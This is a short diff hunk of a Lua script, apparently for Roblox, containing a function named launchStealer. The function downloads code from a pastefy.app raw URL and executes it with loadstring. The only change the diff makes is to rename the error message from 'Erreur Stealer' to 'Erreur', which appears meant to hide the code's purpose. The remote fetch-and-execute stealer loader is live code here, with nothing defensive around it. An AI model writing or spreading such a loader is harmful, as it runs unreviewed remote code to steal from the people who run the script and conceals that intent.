@@ -12,7 +12,7 @@ local function launchStealer()
     local success, err = pcall(function()
         loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
     end)
-    if not success then print("Erreur Stealer: " .. tostring(err)) end
+    if not success then print("Erreur : " .. tostring(err)) end
 end
 
 -- Exécution en threads séparés
